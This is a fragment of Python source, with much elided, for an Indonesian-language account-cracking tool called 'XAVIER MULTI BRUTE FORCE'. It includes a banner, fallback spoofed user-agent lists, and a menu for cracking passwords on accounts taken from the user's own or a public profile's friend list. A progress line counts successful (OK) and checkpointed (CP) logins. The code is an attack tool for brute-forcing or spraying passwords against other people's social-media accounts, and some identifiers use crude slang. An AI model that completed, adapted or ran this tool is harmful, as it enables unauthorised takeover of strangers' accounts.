...
except:ugen = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36']
## MLAKU
def jalan(kontol):
	for wibu in kontol + "\n":
...
def banner():
	wel = '# WELCOME TO XAVIER MULTI BRUTE FORCE'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2)
	au ='____  ___    _____ _____________________ \n\   \/  /   /     \\______   \_   _____/ \n \     /   /  \ /  \|    |  _/|    __) AU:DimzzXD\n /     \  /    Y    \    |   \|     \ \n/___/\  \ \____|__  /______  /\___  / GIT:Xavierous\n      \_/         \/       \/     \/   '

	pengembang1=nel(au,style="on black")
	cetak(nel(pengembang1,))
class login:
...
class menu:
	...
	def main(self):
		...
		jalan(' %s[+] %sselamat Datang Om _< %s%s ]'%(N,H,r,N))
		print(' %s[%s•%s] Alamat IP kamu saat ini : %s'%(N,O,N,IP))
		print(' %s[%s•%s] Kamu masuk pada         : %s'%(N,O,N,waktu))
		print(' %s'%(N))
		print(' %s[%sME%s] CRACK DARI DAFTAR TEMAN SENDIRI     '%(N,O,N))
		print(' %s[%s01%s] CRACK DARI PERTEMANAN PUBLIK      '%(N,O,N))
		print(' %s[%s02%s] CEK RESSULT' %(N,O,N))
		print(' %s[%s00%s] LOG OUT      '%(N,O,N))
		self.pilih()
...
class crack:
		...
		if kham in ['']:
			...
			while True:
				...
				if pw in ['']:
					...
					print(' %s[%s3%s] Metode Mobile (RECOMMENDED)'%(N,O,N))
					manual(pw.split(','))
					break
	...
	def metod2(self,user,pwx):
		...
		nufikhaXD = '%'
		print('\r%s [>_<] %s/%s [OK:%s-CP:%s] >< %s%s%s '%(ram,loop,len(self.id),len(ok),len(cp),int(fikA),str(nufikhaXD),N), end=' ');sys.stdout.flush()
